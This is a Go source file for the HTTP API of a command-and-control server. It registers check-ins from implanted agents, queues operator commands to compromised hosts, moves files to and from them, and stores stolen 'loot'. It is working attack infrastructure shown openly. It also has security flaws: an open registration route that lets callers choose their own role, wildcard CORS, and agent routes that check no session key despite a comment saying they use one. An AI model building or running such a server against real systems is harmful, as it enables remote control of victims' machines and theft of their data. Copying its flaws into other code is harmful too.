package api

import (
	"c2-dect/server/auth"
	"c2-dect/server/core"
	"c2-dect/server/db"
	"c2-dect/server/profiles"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"log"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

type Server struct {
	db        *db.Database
	jwt       *auth.JWTManager
	sessions  *core.SessionManager
	profiles  *profiles.ProfileManager
	listeners map[string]*core.Listener
}

func NewServer(database *db.Database, jwtMgr *auth.JWTManager, profMgr *profiles.ProfileManager) *Server {
	return &Server{
		db:        database,
		jwt:       jwtMgr,
		sessions:  core.NewSessionManager(database),
		profiles:  profMgr,
		listeners: make(map[string]*core.Listener),
	}
}

func (s *Server) SetupRouter() *gin.Engine {
	r := gin.Default()

	// CORS middleware
	r.Use(func(c *gin.Context) {
		c.Header("Access-Control-Allow-Origin", "*")
		c.Header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		c.Header("Access-Control-Allow-Headers", "Content-Type, Authorization")
		if c.Request.Method == "OPTIONS" {
			c.AbortWithStatus(204)
			return
		}
		c.Next()
	})

	// Public routes
	r.POST("/api/auth/login", s.handleLogin)
	r.POST("/api/auth/register", s.handleRegister)

	// Agent routes (no auth, uses session key)
	r.POST("/agent/checkin", s.handleAgentCheckin)
	r.POST("/agent/task/result", s.handleAgentResult)
	r.GET("/agent/task/pending", s.handleAgentGetTask)
	r.POST("/agent/key/exchange", s.handleKeyExchange)

	// Protected API routes
	api := r.Group("/api")
	api.Use(s.authMiddleware())
	{
		api.GET("/sessions", s.handleListSessions)
		api.GET("/sessions/:id", s.handleGetSession)
		api.PUT("/sessions/:id/tag", s.handleTagSession)
		api.DELETE("/sessions/:id", s.handleKillSession)
		api.PUT("/sessions/:id/sleep", s.handleSetSleep)

		api.POST("/sessions/:id/task", s.handleSubmitTask)
		api.GET("/sessions/:id/tasks", s.handleGetTasks)
		api.GET("/sessions/:id/tasks/:taskId", s.handleGetTask)

		api.POST("/sessions/:id/upload", s.handleUpload)
		api.GET("/sessions/:id/download/:name", s.handleDownload)

		api.GET("/loot", s.handleListLoot)
		api.POST("/loot", s.handleSaveLoot)

		api.GET("/stats", s.handleStats)
		api.GET("/profiles", s.handleListProfiles)
		api.POST("/profiles", s.handleCreateProfile)

		// Session cleanup
		api.DELETE("/sessions", s.handleDeleteAllSessions)
		api.POST("/sessions/cleanup", s.handleCleanupStaleSessions)
	}

	return r
}

// --- Auth Handlers ---

func (s *Server) handleLogin(c *gin.Context) {
	var req struct {
		Username string `json:"username" binding:"required"`
		Password string `json:"password" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": "invalid request"})
		return
	}

	op, err := s.db.AuthenticateOperator(req.Username, req.Password)
	if err != nil {
		c.JSON(401, gin.H{"error": "invalid credentials"})
		return
	}

	token, err := s.jwt.GenerateToken(op.ID, op.Username, op.Role)
	if err != nil {
		c.JSON(500, gin.H{"error": "token generation failed"})
		return
	}

	c.JSON(200, gin.H{
		"token":    token,
		"operator": op,
	})
}

func (s *Server) handleRegister(c *gin.Context) {
	var req struct {
		Username string `json:"username" binding:"required"`
		Password string `json:"password" binding:"required"`
		Role     string `json:"role"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": "invalid request"})
		return
	}
	if req.Role == "" {
		req.Role = "operator"
	}

	if err := s.db.CreateOperator(req.Username, req.Password, req.Role); err != nil {
		c.JSON(409, gin.H{"error": "user already exists"})
		return
	}

	c.JSON(201, gin.H{"message": "operator created"})
}

// --- Agent Handlers ---

func (s *Server) handleAgentCheckin(c *gin.Context) {
	var beacon core.Beacon
	if err := c.ShouldBindJSON(&beacon); err != nil {
		c.JSON(400, gin.H{"error": "invalid beacon"})
		return
	}

	// Generate session ID if new
	if beacon.SessionID == "" {
		beacon.SessionID = fmt.Sprintf("%s_%s", beacon.Hostname, uuid.New().String()[:8])
	}

	// Generate ECDH key pair for this session
	curve := ecdh.P256()
	privateKey, _ := curve.GenerateKey(rand.Reader)
	publicKeyBytes := privateKey.PublicKey().Bytes()

	// Store session
	session := &db.Session{
		ID:         beacon.SessionID,
		UUID:       uuid.New().String(),
		Hostname:   beacon.Hostname,
		Username:   beacon.Username,
		InternalIP: beacon.InternalIP,
		OS:         beacon.OS,
		Arch:       beacon.Arch,
		PID:        beacon.PID,
		Process:    beacon.Process,
		Status:     "active",
		SleepSec:   beacon.SleepSec,
	}

	if err := s.db.RegisterSession(session); err != nil {
		c.JSON(500, gin.H{"error": "session registration failed"})
		return
	}
	if err := s.db.SetSessionPublicKey(beacon.SessionID, publicKeyBytes); err != nil {
		// non-critical
	}

	// Store the private key for deriving shared secret later
	s.sessions.StorePrivateKey(beacon.SessionID, privateKey)

	// Get pending tasks
	tasks, _ := s.db.GetPendingTasks(beacon.SessionID)

	// Get profile config
	profile := s.profiles.GetDefault()

	c.JSON(200, gin.H{
		"session_id":  beacon.SessionID,
		"uuid":        session.UUID,
		"sleep_sec":   profile.DefaultSleep,
		"jitter":      profile.Jitter,
		"public_key":  hex.EncodeToString(publicKeyBytes),
		"tasks":       tasks,
	})
}

func (s *Server) handleKeyExchange(c *gin.Context) {
	var req struct {
		SessionID string `json:"session_id"`
		PublicKey string `json:"public_key"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": "invalid request"})
		return
	}

	agentPubBytes, err := hex.DecodeString(req.PublicKey)
	if err != nil {
		c.JSON(400, gin.H{"error": "invalid public key"})
		return
	}

	agentPubKey, err := ecdh.P256().NewPublicKey(agentPubBytes)
	if err != nil {
		c.JSON(400, gin.H{"error": "invalid ECDH public key"})
		return
	}

	privKey := s.sessions.GetPrivateKey(req.SessionID)
	if privKey == nil {
		c.JSON(404, gin.H{"error": "session not found"})
		return
	}

	sharedSecret, err := privKey.ECDH(agentPubKey)
	if err != nil {
		c.JSON(500, gin.H{"error": "ECDH failed"})
		return
	}

	// Derive AES key from shared secret
	hash := sha256.Sum256(sharedSecret)
	aesKey := hash[:]

	s.sessions.StoreAESKey(req.SessionID, aesKey)

	c.JSON(200, gin.H{"status": "ok"})
}

func (s *Server) handleAgentResult(c *gin.Context) {
	var req struct {
		SessionID string `json:"session_id"`
		TaskID    int64  `json:"task_id"`
		Output    string `json:"output"`
		Error     string `json:"error"`
		LootType  string `json:"loot_type,omitempty"`
		LootName  string `json:"loot_name,omitempty"`
		LootData  []byte `json:"loot_data,omitempty"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": "invalid request"})
		return
	}

	s.db.CompleteTask(req.TaskID, req.Output, req.Error)
	s.db.UpdateSessionCheckIn(req.SessionID, c.ClientIP())

	// Save loot if present
	if req.LootType != "" {
		loot := &db.Loot{
			SessionID: req.SessionID,
			Type:      req.LootType,
			Name:      req.LootName,
			Data:      req.LootData,
		}
		s.db.SaveLoot(loot)
	}

	c.JSON(200, gin.H{"status": "ok"})
}

func (s *Server) handleAgentGetTask(c *gin.Context) {
	sessionID := c.Query("session_id")
	if sessionID == "" {
		c.JSON(400, gin.H{"error": "session_id required"})
		return
	}

	s.db.UpdateSessionCheckIn(sessionID, c.ClientIP())

	task, err := s.db.GetNextTask(sessionID)
	if err != nil {
		c.JSON(200, gin.H{"status": "no_tasks"})
		return
	}

	c.JSON(200, gin.H{
		"status": "task",
		"task":   task,
	})
}

// --- Operator API Handlers ---

func (s *Server) authMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		authHeader := c.GetHeader("Authorization")
		if authHeader == "" {
			c.JSON(401, gin.H{"error": "authorization required"})
			c.Abort()
			return
		}

		token := strings.TrimPrefix(authHeader, "Bearer ")
		claims, err := s.jwt.ValidateToken(token)
		if err != nil {
			c.JSON(401, gin.H{"error": "invalid token"})
			c.Abort()
			return
		}

		c.Set("operator_id", claims.OperatorID)
		c.Set("username", claims.Username)
		c.Set("role", claims.Role)
		c.Next()
	}
}

func (s *Server) handleListSessions(c *gin.Context) {
	status := c.Query("status")
	sessions, err := s.db.ListSessions(status)
	if err != nil {
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	c.JSON(200, gin.H{"sessions": sessions})
}

func (s *Server) handleGetSession(c *gin.Context) {
	sessionID := c.Param("id")
	session, err := s.db.GetSession(sessionID)
	if err != nil {
		c.JSON(404, gin.H{"error": "session not found"})
		return
	}
	c.JSON(200, session)
}

func (s *Server) handleTagSession(c *gin.Context) {
	sessionID := c.Param("id")
	var req struct {
		Tags string `json:"tags"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": "invalid request"})
		return
	}
	if err := s.db.TagSession(sessionID, req.Tags); err != nil {
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	c.JSON(200, gin.H{"status": "ok"})
}

func (s *Server) handleKillSession(c *gin.Context) {
	sessionID := c.Param("id")
	s.handleSubmitTaskRaw(sessionID, "exit", "", c)
}

func (s *Server) handleSetSleep(c *gin.Context) {
	sessionID := c.Param("id")
	var req struct {
		SleepSec int `json:"sleep_sec"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": "invalid request"})
		return
	}
	if err := s.db.UpdateSessionSleep(sessionID, req.SleepSec); err != nil {
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	s.handleSubmitTaskRaw(sessionID, "sleep", strconv.Itoa(req.SleepSec), c)
}

func (s *Server) handleSubmitTask(c *gin.Context) {
	sessionID := c.Param("id")
	var req struct {
		Command string `json:"command" binding:"required"`
		Args    string `json:"args"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": "invalid request"})
		return
	}
	s.handleSubmitTaskRaw(sessionID, req.Command, req.Args, c)
}

func (s *Server) handleSubmitTaskRaw(sessionID, command, args string, c *gin.Context) {
	operatorID, _ := c.Get("operator_id")

	task := &db.Task{
		SessionID:  sessionID,
		Command:    command,
		Args:       args,
		OperatorID: operatorID.(int64),
	}

	if err := s.db.CreateTask(task); err != nil {
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}

	c.JSON(201, gin.H{"task": task})
}

func (s *Server) handleGetTasks(c *gin.Context) {
	sessionID := c.Param("id")
	tasks, err := s.db.GetTasksBySession(sessionID, 100)
	if err != nil {
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	c.JSON(200, gin.H{"tasks": tasks})
}

func (s *Server) handleGetTask(c *gin.Context) {
	// For simplicity, return task by searching in session tasks
	sessionID := c.Param("id")
	taskID := c.Param("taskId")
	tasks, _ := s.db.GetTasksBySession(sessionID, 200)
	for _, t := range tasks {
		if fmt.Sprintf("%d", t.ID) == taskID {
			c.JSON(200, t)
			return
		}
	}
	c.JSON(404, gin.H{"error": "task not found"})
}

func (s *Server) handleUpload(c *gin.Context) {
	sessionID := c.Param("id")
	file, header, err := c.Request.FormFile("file")
	if err != nil {
		c.JSON(400, gin.H{"error": "no file provided"})
		return
	}
	defer file.Close()

	remotePath := c.PostForm("remote_path")
	if remotePath == "" {
		remotePath = header.Filename
	}

	data := make([]byte, header.Size)
	file.Read(data)

	task := &db.Task{
		SessionID: sessionID,
		Command:   "upload",
		Args:      fmt.Sprintf("%s:%d", remotePath, len(data)),
	}
	s.db.CreateTask(task)

	// Store file data as loot
	loot := &db.Loot{
		SessionID: sessionID,
		Type:      "upload",
		Name:      header.Filename,
		Data:      data,
		Path:      remotePath,
	}
	s.db.SaveLoot(loot)

	c.JSON(200, gin.H{"status": "upload queued", "remote_path": remotePath, "size": len(data)})
}

func (s *Server) handleDownload(c *gin.Context) {
	sessionID := c.Param("id")
	fileName := c.Param("name")

	task := &db.Task{
		SessionID: sessionID,
		Command:   "download",
		Args:      fileName,
	}
	s.db.CreateTask(task)

	c.JSON(200, gin.H{"status": "download requested"})
}

func (s *Server) handleListLoot(c *gin.Context) {
	sessionID := c.Query("session_id")
	loots, err := s.db.ListLoot(sessionID)
	if err != nil {
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	c.JSON(200, gin.H{"loot": loots})
}

func (s *Server) handleSaveLoot(c *gin.Context) {
	var loot db.Loot
	if err := c.ShouldBindJSON(&loot); err != nil {
		c.JSON(400, gin.H{"error": "invalid request"})
		return
	}
	if err := s.db.SaveLoot(&loot); err != nil {
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	c.JSON(201, gin.H{"status": "saved"})
}

func (s *Server) handleStats(c *gin.Context) {
	c.JSON(200, gin.H{
		"total_sessions":   s.db.SessionCount(),
		"active_sessions":  s.db.ActiveSessionCount(),
		"timestamp":        time.Now().UTC().Format(time.RFC3339),
	})
}

func (s *Server) handleDeleteAllSessions(c *gin.Context) {
	operatorID, _ := c.Get("operator_id")
	log.Printf("Operator %v deleted all sessions", operatorID)
	if err := s.db.DeleteAllSessions(); err != nil {
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	c.JSON(200, gin.H{"status": "all sessions deleted"})
}

func (s *Server) handleCleanupStaleSessions(c *gin.Context) {
	var req struct {
		MaxAgeMinutes int `json:"max_age_minutes"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.MaxAgeMinutes <= 0 {
		req.MaxAgeMinutes = 30
	}
	deleted, err := s.db.CleanupStaleSessions(req.MaxAgeMinutes)
	if err != nil {
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	c.JSON(200, gin.H{"deleted": deleted, "max_age_minutes": req.MaxAgeMinutes})
}

func (s *Server) handleListProfiles(c *gin.Context) {
	profiles := s.profiles.List()
	c.JSON(200, gin.H{"profiles": profiles})
}

func (s *Server) handleCreateProfile(c *gin.Context) {
	var profile profiles.MalleableProfile
	if err := c.ShouldBindJSON(&profile); err != nil {
		c.JSON(400, gin.H{"error": "invalid request"})
		return
	}
	if err := s.profiles.Save(&profile); err != nil {
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	c.JSON(201, gin.H{"status": "created"})
}
